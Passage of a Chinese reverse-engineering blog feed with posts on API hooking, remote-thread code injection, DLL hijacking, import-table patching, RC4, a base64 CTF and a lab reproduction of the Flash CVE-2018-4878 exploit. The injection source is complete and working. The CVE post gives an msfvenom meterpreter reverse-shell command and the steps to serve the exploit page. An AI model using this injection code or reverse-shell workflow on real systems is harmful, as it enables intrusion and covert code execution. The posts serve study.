+A0h DWORD Ebx // | 寄 +A4h DWORD Edx // | 存 +A8h DWORD Ecx // | 器 +ACh DWORD Eax //_|___组_ +B0h DWORD Ebp //++++++ +B4h DWORD Eip // |控制 +B8h DWORD SegCs // |寄存 +BCh DWORD EFlag // |器组 +C0h DWORD Esp // | +C4h DWORD SegSs //++++++ +C8h BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; 下面是获取线程上下文的代码。 12ctx.ContextFlags = CONTEXT_CONTROL;GetThreadContext(g_cpdi.hThead, &amp;ctx); 像这样调用GetThreadContext() API，即可将指定线程的CONTEXT存储到ctx结构体变量。 123456BOOL GetThreadContext(HANDLE hThread, // handle of thread with contextLPCONTEXT lpContext // address of context structure); 3、获取WriteFile()的param2、3的值调用WriteFile()函数时，我们要在传递过来的参数中知道param2（数据缓冲区地址）与param3（缓冲区大小）这两个参数。通过CONTEXT.Esp成员可以分别获得它们的值。 12345//获取WriteFile()的param 2、3值，param 2 = ESP + 0x8、param 3 = ESP + 0xC ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8), &amp;dwAddrOfBuffer, sizeof(DWORD), NULL);ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp +0xC), &amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL); 4、把小写字母转换为大写字母后覆写WriteFile()缓冲区获取数据缓冲区的地址与大小后，将其内容读到调试器的内存空间，把小写字母转换为大写字母。然后将修改后的大写字母覆写到原位置。 12345678910111213141516171819202122//分配临时缓冲区lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite+1);memset(lpBuffer, 0, dwNumOfBytesToWrite+1);//复制WriteFile()缓冲区到临时缓冲区 ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL);printf(&quot;\n### original string ###\n%s\n&quot;, lpBuffer);//将小写字母转换为大写字母for( i = 0; i &lt; dwNumOfBytesToWrite; i++ )&#123; if( 0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A ) lpBuffer[i] -= 0x20;&#125;printf(&quot;\n### converted string ###\n%s\n&quot;, lpBuffer);//将变换后的缓冲区复制到WriteFile()缓冲区WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, lpBuffer, dwNumOfBytesToWrite, NULL); //释放临时缓冲区free(lpBuffer); 5、把线程上下文的EIP修改为WriteFile()起始地址修改好CONTEXT.Eip成员后，调用SetThreadContext() API。 12//将线程上下文的EIP更改为WriteFile()的首地址ctx.Eip = (DWORD)g_pfWriteFile; SetThreadContext(g_cpdi.hThread, &amp;ctx); 6、运行调试进程调用ContinueDebugEvent() API可以重启进程，使之继续运行。7、设置API“钩子”最后设置API“钩子”，方便下次钩取操作。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码注入]]></title>
    <url>%2F2020%2F03%2F25%2F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[1、代码注入代码注入是一种向目标进程插入独立运行代码并使之运行的技术，它一般调用CreateRemoteThread() API以远程线程形式运行插入的代码，所以也被称为线程注入。原理如图所示：首先向目标进程插入代码于=与数据，在此过程中，代码以线程过程（Thread Procedure）形式插入，二代码中使用的数据则以线程参数的形式传入。也就是说，代码与数据是分别注入的。使用代码注入的原因：1、占用内存少如果要注入的代码与数据较少，那么就不需要讲它们做成DLL的形式注入。采用直接代码注入的方式同样能够获得与DLL注入相同的效果，且占用的内存会更少。2、难以查找痕迹采用DLL注入方式会在目标进程的内存中留下相关的痕迹，采用代码注入方式几乎不会留下任何痕迹。DLL注入技术主要用在代码量大且复杂的时候，而代码注入技术则适合用于代码量较少的情况。 2、注入示例1、运行notepad.exe首先运行notepad.exe，然后查看进程的PID，如图所示：2、运行CodeInjection.exe在命令行窗口输入命令与参数（notepad.exe的PID），回车运行：3、弹出消息框notepad.exe进程中弹出一个消息框，如图所示： 3、代码1、main()函数首先看一下main()函数。 1234567891011121314151617181920int main(int argc, char *argv[])&#123; DWORD dwPID = 0; if( argc != 2 ) &#123; printf(&quot;\n USAGE : %s &lt;pid&gt;\n&quot;, argv[0]); return 1; &#125; // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // code injection dwPID = (DWORD)atol(argv[1]); InjectCode(dwPID); return 0;&#125; main()函数用来调用InjectCode()函数，传入的函数参数为目标进程的PID。 2、ThreadProc()函数该函数为注入目标进程的代码（线程函数）。 123456789101112131415161718192021DWORD WINAPI ThreadProc(LPVOID lParam)&#123; PTHREAD_PARAM pParam = (PTHREAD_PARAM)lParam; HMODULE hMod = NULL; FARPROC pFunc = NULL; // LoadLibrary() hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[0])(pParam-&gt;szBuf[0]); // &quot;user32.dll&quot; if( !hMod ) return 1; // GetProcAddress() pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[1])(hMod, pParam-&gt;szBuf[1]); // &quot;MessageBoxA&quot; if( !pFunc ) return 1; // MessageBoxA() ((PFMESSAGEBOXA)pFunc)(NULL, pParam-&gt;szBuf[2], pParam-&gt;szBuf[3], MB_OK); return 0;&#125; 上述代码看起来比较复杂，其实等同于 123hMod = LoadLibraryA(&quot;user32.dll&quot;);pFunc = GetProcAddress(hMod, &quot;MessageBoxA&quot;);pFunc(NULL, &quot;www.reversecore.com&quot;, &quot;ReverseCore&quot;, MB_OK); 从上述代码中的ThreadProc()函数可以看到，函数中并未直接调用相关API，也未直接定义用字符串，它们都是通过THREAD_PARAM结构体以线程参数的形式传递使用。原因在于编译的过程中，编译器将会把调用API的地址写死，但是在目标进程中对应的地址并不一定存在该函数，导致代码不能正常工作。因此我们通过重定义API函数，使其不依赖动态库的调用。 3、InjectCode()函数InjectCode()是代码注入的核心部分，以下是代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091BOOL InjectCode(DWORD dwPID)&#123; HMODULE hMod = NULL; THREAD_PARAM param = &#123;0,&#125;; HANDLE hProcess = NULL; HANDLE hThread = NULL; LPVOID pRemoteBuf[2] = &#123;0,&#125;; DWORD dwSize = 0; hMod = GetModuleHandleA(&quot;kernel32.dll&quot;); // set THREAD_PARAM param.pFunc[0] = GetProcAddress(hMod, &quot;LoadLibraryA&quot;); param.pFunc[1] = GetProcAddress(hMod, &quot;GetProcAddress&quot;); strcpy_s(param.szBuf[0], &quot;user32.dll&quot;); strcpy_s(param.szBuf[1], &quot;MessageBoxA&quot;); strcpy_s(param.szBuf[2], &quot;www.reversecore.com&quot;); strcpy_s(param.szBuf[3], &quot;ReverseCore&quot;); // Open Process if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, // dwDesiredAccess FALSE, // bInheritHandle dwPID)) ) // dwProcessId &#123; printf(&quot;OpenProcess() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; // Allocation for THREAD_PARAM dwSize = sizeof(THREAD_PARAM); if( !(pRemoteBuf[0] = VirtualAllocEx(hProcess, // hProcess NULL, // lpAddress dwSize, // dwSize MEM_COMMIT, // flAllocationType PAGE_READWRITE)) ) // flProtect &#123; printf(&quot;VirtualAllocEx() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; if( !WriteProcessMemory(hProcess, // hProcess pRemoteBuf[0], // lpBaseAddress (LPVOID)&amp;param, // lpBuffer dwSize, // nSize NULL) ) // [out] lpNumberOfBytesWritten &#123; printf(&quot;WriteProcessMemory() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; // Allocation for ThreadProc() dwSize = (DWORD)InjectCode - (DWORD)ThreadProc; if( !(pRemoteBuf[1] = VirtualAllocEx(hProcess, // hProcess NULL, // lpAddress dwSize, // dwSize MEM_COMMIT, // flAllocationType PAGE_EXECUTE_READWRITE)) ) // flProtect &#123; printf(&quot;VirtualAllocEx() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; if( !WriteProcessMemory(hProcess, // hProcess pRemoteBuf[1], // lpBaseAddress (LPVOID)ThreadProc, // lpBuffer dwSize, // nSize NULL) ) // [out] lpNumberOfBytesWritten &#123; printf(&quot;WriteProcessMemory() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; if( !(hThread = CreateRemoteThread(hProcess, // hProcess NULL, // lpThreadAttributes 0, // dwStackSize (LPTHREAD_START_ROUTINE)pRemoteBuf[1], // dwStackSize pRemoteBuf[0], // lpParameter 0, // dwCreationFlags NULL)) ) // lpThreadId &#123; printf(&quot;CreateRemoteThread() fail : err_code = %d\n&quot;, GetLastError()); return FALSE; &#125; WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE;&#125; InjectCode()函数的set THREAD_PARAM部分用来设置THREAD_PARAM结构体变量，它们会注入目标进程，并且以参数形式传递给ThreadProc()线程函数。其核心API函数整理如下： 1234567891011OpenProcess()//data : THREAD_PARAMVirtualAllocEx()WriteProcessMemory()//code : ThreadProc()VirtualAllocEx()WriteProcessMemory()CreateRemoteThread() 上述代码主要用来在目标进程中分别为data和code分配内存，并将它们注入进程。最后调用CreteRemoteThread（） API，执行远程线程。 3、调试代码注入是一种向目标进程创建新线程的技术，在OD的Debugging options中将Events设置为Break on new thread。从现在开始，每当notepad.exe进程中生成新线程，调试器就暂停在线程函数开始的代码位置。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[输入表]]></title>
    <url>%2F2020%2F03%2F23%2F%E8%BE%93%E5%85%A5%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[1、输入表1.1 输入表结构OriginalFirstThunk和FirstThunk相似，它们分别指向两个本质上相同的数组IMAGE_THUNK_DATA结构。它是一个指针大小的联合体（union）。每个IMAGE_THUNK_DATA元素对应于一个可执行文件输入的函数。具体如下：IMAGRE_IMPORT_BY_NAME结构仅有一个字节大小，存储了一个输入函数的相关信息，结构如下： 1.2 输入地址表OriginalFirstThunk是单独的一项，不可改写，称为INT。FirstThunk是PE装载器重写的。PE装载器首先搜索OriginalFirstThunk，如果找到，加载程序就迭代搜索数组中的每一个指针，找出每一个IMAGRE_IMPORT_NAME结构所指向的输入函数的地址。然后，加载器用真正的入口地址来替代由FirstThunk指向的IMAGE_THUNK_DATA数组里元素的值。因此该表被称为输入地址表（Import Address Table，IAT） 2、一道CTF实例（脱壳后IAT表修复）在这里我们主要讲IAT表，脱壳过程不做讲解。从图中我们可以看出该文件的IAT表是错的。打开OD，右键-&gt;查找-&gt;当前模块中的名称可以看到，该程序第一个调用的为Sleep函数，该函数在PE中的偏移位置为26A4，我们继续查找PE中出现26A4的地方，如图所示：该位置即为IID数组的位置。我们还要找到该程序加载了几个DLL，通过搜索我们可以发现，它调用了KERNEL32.dll（偏移位置27B0）、MSVCP90.dll（偏移位置24D0）、MSVCR90.dll（偏移位置2500）三个DLL。现在我们开始修复IAT表，在2000位置插入然后在空闲位置输入新的IAT表，改变的位置为2800和大小C8。程序成功运行。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DLL注入方法（二）DLL劫持法]]></title>
    <url>%2F2020%2F03%2F19%2FDLL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89DLL%E5%8A%AB%E6%8C%81%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、DLL劫持漏洞原理在Windows系统中，为了节省内存和实现代码重用，微软在Windows操作系统中实现了一种共享函数库的方式。这就是DLL（Dynamic Link Library），即动态链接库，这种库包含了可由多个程序同时使用的代码和数据。每个DLL都有一个入口函数（DLLMain），系统在特定环境下会调用DLLMain。在下面的事件发生时就会调用dll的入口函数： 1.进程装载DLL。 2.进程卸载DLL。 3.DLL在被装载之后创建了新线程。 4.DLL在被装载之后一个线程被终止了。windows xp sp2之后微软为了防止DLL劫持漏洞的产生，在XP SP2之后，添加了一个SafeDllSearchMode的注册表属性。注册表路径如下： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\SafeDllSearchMode当SafeDllSearchMode的值设置为1，即安全DLL搜索模式开启时，查找DLL的目录顺序如下： 1.程序所在目录 2.系统目录即 SYSTEM32 目录。 3.16位系统目录即 SYSTEM 目录。 4.Windows目录。 5.加载 DLL 时所在的当前目录。 6.PATH环境变量中列出的目录。windows 7 以上版本系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从exe自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置： HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs 2、下面我们结合AheadLib工具进行DLL劫持这是劫持前的运行样子： 运行AheadLib.exe，生成.cpp文件，复制下其中的代码，在VC环境中创建DLL项目，将代码粘贴上去，加入一段我们自己的代码： 1MessageBox(NULL,&quot;劫持成功!!!&quot;,TEXT(&quot;DLL Path&quot;),MB_ICONSTOP); 将原MsgDll.dll文件改名为a.dll，编译，生成的.dll文件改名为MsgDll.dll,将MsgDll.dll文件放入到notepad.exe文件目录下，点击运行，可以看到劫持成功。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DLL注入方法（一）通过干预输入表处理过程加载目标DLL]]></title>
    <url>%2F2020%2F03%2F19%2FDLL%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%EF%BC%88%E4%B8%80%EF%BC%89%E9%9D%99%E6%80%81%E4%BF%AE%E6%94%B9PE%E8%BE%93%E5%85%A5%E8%A1%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[1、静态修改PE输入表法准备工作：一个自行编写的MsgDLL.dll，导出了一个Msg()。修改对象：系统（Windows XP）自带的“记事本”程序notepad.exe。修改目标：启动notepad.exe时能够加载MsgDLL.dll。MsgDLL.dll的主要功能是在DllMain中弹出一个MessageBox来展示自己的存在，代码如下。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &quot;stdafx.h&quot;#include &lt;stdio.h&gt;VOID Msg();DWORD WINAPI ThreadShow(LPVOID lpParameter);void WriteLog(char *info,char *logfilename);BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; if (ul_reason_for_call == DLL_PROCESS_ATTACH) &#123; CreateThread(NULL,0,ThreadShow,NULL,0,NULL); &#125; return TRUE;&#125;DWORD WINAPI ThreadShow(LPVOID lpParameter)&#123; char szPath[MAX_PATH]=&#123;0&#125;; char szBuf[1024]=&#123;0&#125;; GetModuleFileName(NULL,szPath,MAX_PATH); sprintf(szBuf,&quot;Dll已注入到进程 %s [Pid = %d]\n&quot;,szPath,GetCurrentProcessId()); //以三种方式显示自己的存在 //1.控制台 //fprintf((FILE*)GetStdHandle(STD_ERROR_HANDLE),&quot;%s&quot;,szBuf); printf(&quot;%s&quot;,szBuf); //2.调试器 OutputDebugString(szBuf); //3.Msgbox Sleep(800); MessageBox(NULL,szBuf,&quot;Dll Inject&quot;,MB_OK); return 0 ;&#125;void WriteLog(char *info,char *logfilename)&#123; HANDLE hFile; static char tmp[100]; DWORD dwwritten=0; static SYSTEMTIME systime; GetLocalTime(&amp;systime); sprintf(tmp,&quot;%04dd-%02d-%02d %02d:%02d:%02d &quot;,systime.wYear,systime.wMonth,systime.wDay,systime.wHour,systime.wMinute,systime.wSecond); hFile=CreateFile(logfilename,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL); if(INVALID_HANDLE_VALUE!=hFile) &#123; SetFilePointer(hFile,0,0,SEEK_END); WriteFile(hFile,tmp,lstrlen(tmp),&amp;dwwritten,NULL); WriteFile(hFile,info,lstrlen(info),&amp;dwwritten,NULL); WriteFile(hFile,&quot;\r\n&quot;,2,&amp;dwwritten,NULL); CloseHandle(hFile); &#125;&#125;//导出函数VOID Msg()&#123;&#125; （1）备份原IID结构原输入表的RVA为0x7604，它的RawOffset为0x7604 - 0x1000 + 0x400 = 0x6A04，大小为0xC8。增加一个节，将IID数组复制到空白区域，偏移量是0x10400，如图所示。 （2）在原IID区域构建新IID的OriginalFirstThunk、Name和FirstThunk结构 （3）填充新输入表项的IID结构根据刚才填充的两个结构和Name的偏移，填写新的IID项，如图所示。TimeDateStamp这一项我们没有，所以填0。 （4）修正PE文件头的信息1、修改输入表指向的位置以及大小。2、修改新区块的属性。注入成功]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2018-4878漏洞复现]]></title>
    <url>%2F2019%2F12%2F10%2FCVE-2018-4878%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[1、 引言2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。本文基于Talos文章中给出的样本及360安全卫士团队输出的报告，对相关样本做进一步的解析以丰富相应的技术细节，但是不涉及CVE-2018-4878漏洞的分析。2018年1月31日，韩国CERT发布公告称发现Flash 0day漏洞的野外利用，攻击者执行针对性的攻击；2月1日Adobe发布安全公告，确认Adobe Flash Player 28.0.0.137 及早期版本存在远程代码执行漏洞（CVE-2018-4878）；2月2日，Cisco Talos团队发布了事件涉及攻击样本的简要分析；2月7日，Adobe发布了CVE-2018-4878漏洞的安全补丁。本文基于Talos文章中给出的样本及360安全卫士团队输出的报告，对相关样本做进一步的解析以丰富相应的技术细节，但是不涉及CVE-2018-4878漏洞的分析。2、影响版本Flash Player版本28.0.0.137以及之前的所有版本。3、漏洞复现4.1 漏洞复现环境Kali Linux + Windows 7 sp1 渗透机：Kali Linux 靶机：Windows 7 sp1 EXP：CVE-2018-4878.py Flash：flashplayer_activex_28.0.0.137.exe4.2 复现流程1、准备一台kali虚拟机与一台已关闭防火墙的win7虚拟机。 2、查看两台虚拟机的ip地址 Win7命令行：ipconfig： kali命令行：ifconfig： 3、在Kali Linux中使用msfvenom生成一个Python类型的Shell Code，代码如下： 1msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.36.249 lport=4444 -f python&gt;shellcode.txt lhost为Kali Linux的IP地址，lport为端口号，可以为其他。 4、生成shellcode.txt文件，打开cve-2018-4878.py文件和shellcode.txt文件，将cve-2018-4878.py中的shellcode替换为shellcode.txt中的shellcode。左图为cve-2018-4878.py中的代码，右图为shellcode.txt中的代码，将左图中的代码替换为右图中的代码，并保存更改。 5、修改cve-2018-4878.py中的文件信息，将其更改为自己存放的文件目录名，保存更改。（本人存放于文件CVE-2018-4878-master） 6、Kali Linux进入CVE-2018-4878-master路径，执行命令python cve-2018-4878.py生成exploit.swf和index2.html两个文件。 7、Kali Linux开启Apache2服务，将exploit.swf和index2.html文件复制到/var/www/html目录中。此时，Kali Linux上Web服务器启动，并且具备index2.html整个页面。只要靶机启用Flash插件并且访问该页面，则靶机可直接被控制。 8、Kali Linux在mfs5下使用handler模块开启会话监听。回弹一个tcp连接。设置kali渗透机的IP地址。设置监听端口，这个需跟上面msfvenom设置的端口一致。开启监听，等待目标上线。 9、在Windows7上 安装flash插件，使用Win7内置的IE 8浏览器访问页面：http://192.168.36.249/index2.html，页面显示如下。 10、切换到Kali Linux虚拟机，可以看到Kali Linux虚拟机上获取到了meterpreter shell，接下来可以用命令对靶机进行操作和管理。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RC4算法学习]]></title>
    <url>%2F2019%2F09%2F15%2FRC4%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[算法原理RC4生成一种称为密钥流的伪随机流，它与明文通过异或操作混合，以达到加密的目的，解密时与密文进行异或操作。其密钥流由两部分组成，分别是KSA和PRGA。 （1）KSA（the Key-Scheduling Algorithm）RC4首先使用密钥调度算法（KSA）完成对大小为256个字节的数组S的初始化及替换，在替换时使用密钥。其密钥长度一般取516字节，即40128位，通常不超过256位。先用0~255初始化数组S，然后使用密钥进行替换，C语言代码如下： 12345678910111213141516171819202122232425262728293031323334353637/*初始化S盒*/void InitSbox(unsigned char sbox[])&#123; for(int i = 0; i &lt; 256; i++) sbox[i] = i;&#125;/*密钥填充256数组*/void KeyExpansion(unsigned char key[], char *k, int len)&#123; if(len &lt;= 256) &#123; for(int i = 0; i &lt; 256; i++) key[i] = k[i % len]; &#125; if(len &gt; 256) &#123; for(int i = 0; i &lt; 256; i++) key[i] = k[i]; &#125;&#125;/*打乱S盒*/ void UpsetSbox(unsigned char sbox[], unsigned char key[])&#123; int j = 0; unsigned char temp; int n; for(int i = 0; i &lt; 256; i++) &#123; n = j + (int)sbox[i] + (int)key[i]; j = n % 256; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; &#125;&#125; （2）PRGA（the Pseudo-Random Generation Algorithm）数组S在完成初始化之后，便不再使用输入的密钥。密钥流的生成是从S[0]到S[255]的。对每个S[i]，根据当前的S的值，将S[i]与S中的另一字节置换。在S[255]完成转换后，操作仍重复执行。 12345678910111213141516171819202122/*加解密数据*/ void DataProcess(unsigned char sbox[], FILE *fp1, FILE *fp2)&#123; int i, j; i = 0; j = 0; char ch = fgetc(fp1); while(ch != EOF) &#123; i = (i + 1) % 256; int temp2 = j + (int)sbox[i]; j = temp2 % 256; unsigned char temp; temp = sbox[i]; sbox[i] = sbox[j]; sbox[j] = temp; int temp1 = (int)sbox[i] + (int)sbox[j]; int t = temp1 % 256; char k = sbox[t]; char cipherchar = ch ^ k; fputc(cipherchar, fp2); ch = fgetc(fp1); &#125;&#125;]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道base64算法CTF]]></title>
    <url>%2F2019%2F09%2F13%2F%E4%B8%80%E9%81%93BASE64%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95CTF%2F</url>
    <content type="text"><![CDATA[1、题目内容前两天做了道关于base64算法的题，flag为一段base64编码过后的密文，下面是这道题的链接：https://adworld.xctf.org.cn/media/task/attachments/a5c0e8322d9645468befabddfe0cb51d.exe 题目来源：XCTF社区2、解题过程这是一个exe文件，先用PEID进行查壳，没有壳，运行看看，要求你输入一个flah？拖入IDA，找到_main函数，按F5，代码如下我们可以看到一串关键字符串，逆推，字符串上方有一句for循环语句，经过异或得到下方的字符串，我用C语言写了段代码进行解密，代码如下： 12345678910#include &lt;stdio.h&gt;int main()&#123; int i; char str[50] = "you_know_how_to_remove_junk_code"; for(i = 0; str[i] != '\0'; i++) str[i] = str[i] ^ 0x25; printf("%s\n", str); return 0;&#125; 得到输出： 1\JPzNKJRzMJRzQJzW@HJS@zOPKNzFJA@ 单击v13，再往前推可以发现还有两处di调用过v13，第二处的调用貌似没什么用，应该是垃圾代码，我们直接看第一次调用v13的函数，单击进入 这里是一段关键代码，再点击byte_414E40这个函数 现在可以判断使用了base64解码，所以将刚刚得到的字符串进行编码就可得到falg： 1XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一些Windows基础知识]]></title>
    <url>%2F2019%2F09%2F13%2F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[1、单位转换bit 位(指的是 0 or 1) byte 字节 1byte = 8 bit word 字 1 word = 2 byte dword (double word) 1KB=1024B 1MB=1024KB 1GB=1024MB 1TB=1024GB2、字节序大端序（Big endain） ：内存地址低位储存数据的高位， 小端序（Little endain）：内存地址高位储存数据的高位（x86是基于Intel8086处理器的小端体系结构） 3、ASCII码 4、Win APIAPI全名（Application Programming Interface 应用程序编程接口） 用于16位Windows的API（Windows1.0-Windows3.1）称作“Win16”，用于32位Windows的API（Windows 9x/NT/2000/XP/7/10）叫作“Win32”。64位WindowsAPI的名称和功能基本没有变化，还是使用Win32的函数名，只不过是用64位代码实现的。API函数调用从Win16到Win32的转变中保持兼容，并且数量和功能上不断增强——Windows10 1.0只支持不到450个函数调用，现在已有几千个函数了。 Windows运转的核心是动态链接。Windows提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库（DLL）实现。在Windows 9x 中，DLL通常位于\WINDOWS\SYSTEM子目录中。在Windows NT/2000/XP/7中，DLL通常位于系统安装目录的\SYSTEM和\SYSTEM32子目录中。 在早期，Windows的主要部分只需要在3个动态链接库中实现，它们分别代表Windows的三个主要子系统，叫做Kernel、User和GDI。 Kernel （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：操作系统核心功能服务，包括进程与线程控制、内存管理、文件访问等； User （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：负责处理用户接口，包括键盘和鼠标输入、窗口和菜单管理等； GUI （由16位的KRNL386.EXE和32位KERNEL32.DLL实现）：图形设备接口，允许程序在屏幕和打印机上显示文本和图形。 除了上述模块，Windows提供了其他DLL以支持更多功能，包括对象安全性、注册表操作（ADVAPI32.DLL）、通用控件（COMCTL32.DLL）、公共对话框（COMDLG32.DLL）、用户界面外壳（SHELL32.DLL）和网络（NETAPTI32.DLL）。5、WOW64WOW64（Windows-on-Windows64-bit）是64位Windows操作系统的子系统，可以使大多数32位应用程序在不进行修改的情况下运行在64位操作系统上。 64位的Windows，除了带有64位操作系统应有的系统文件，还带有32位操作系统应有的系统文件。Windows的64位系统应有的系统文件，还带有32位操作系统应有的系统文件。Windows的64位系统文件都放在一个叫做“System32“的文件夹中，\Windows\System32文件夹中包含原生的64位映像文件。为了兼容32位操作系统，还增加了\Windows\SysWOW64文件夹，其中存储了32位的操作系统。 64位应用程序会加载System32目录下64位的kernel32.dll、user32.dll和ntdll.dll。当32位应用程序加载时，WOW64建立32位ntdll.dll所要求的启动环境，将CPU模式切换至32位，并开始执行32位加载器，就如同该进程在原生32位系统上一样。WOW64会对32位ntdll.dll的调用重定向ntdll.dll（64位），而不是发出原生的32位系统调用指令。WOW64转换到原生的64位模式，捕获于系统调用有关的参数，发出对应的原生64位系统调用。当原生的系统调用返回时，WOW64在返回32位模式之前将所有输出参数从64位转换成32位。 WOW64既不支持16位应用程序的执行（32位Windows支持16位应用程序的执行），也不支持加载32位内核模式的设备驱动。WOW64进程只能加载32位的DLL，不能加载原生的64位DLL。类似的，原生的64位进程不能加载32位的DLL。6、Windows消息机制Windows是一个消息（Message）驱动式系统。Windows消息提供在应用程序于应用程序之间、应用程序于Windows系统之间进行通信的手段。应用程序想要实现的功能由消息触发，通过对消息的相应和处理完成。 Windows系统中有两种消息队列：一种是系统消息队列；另一种是应用程序消息队列。计算机的所有输入设备由Windows监控。当一个事件发生时，WIindows先将输入的消息放入系统消息队列，再将输入的消息复制到相应的应用程序队列中，应用程序中的消息循环在它的消息队列中检索每个消息并发送给相应的函数窗口。（1）SendMessage函数 （2）WM_COMMANFD消息 （3）WM_COMMAND消息 （4）WM_GETTEXT消息 （5）WM_QUIT消息 （6）WM_LBUTTONDOWN消息 7、虚拟内存在默认情况下，32位Windows操作系统的地址空间是在4GB以内。Win32的平坦内存模式使每个进程都拥有自己的虚拟空间。对32位进程来说，这个地址空间是4GB，因为32位指针拥有00000000h-FFFFFFFFh的任何值。此时，进程的代码和数据都放在同一地址空间中，不必区分代码段和数据段。 虚拟内存（Virtual Memory）不是真正的内存，它通过映射（Map）的方法使可用的虚拟地址（Virtual Address）达到4GB，每个应用程序可以获得2GB的虚拟地址，剩下的2GB留给操作系统自用。在Windows NT中，应用程序甚至可以获得3GB的虚拟地址。 Windows是一个分时的多任务操作系统，CPU时间在被分成一个个时间片后分配给不同的应用程序。在一个时间片里，与这个程序的执行无关的内容不会映射到线性地址中。因此，每个程序都有自己的4GB寻址空间，互不干扰。在物理内存中，操作系统和系统DLL代码需要供每个应用程序调用，所以他们在任意时刻必须被映射。用户的exe程序只在自己所属的时间片内被映射，用户dll则有选择地被映射。 实现方法和过程如下： 1、当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配2GB的虚拟地址（不是内存，只是地址）。 2、虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入物理地址（注意：虚拟地址与应用程序代码在物理内存中的位置是没有关系的）。 3、如果使用DLL，DLL也会被映射到进程的虚拟地址空间中。然后，虚拟内存管理器把每次内存访问映射到物理地址。]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows内核函数]]></title>
    <url>%2F2019%2F09%2F12%2FWindows%20%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0%2F</url>
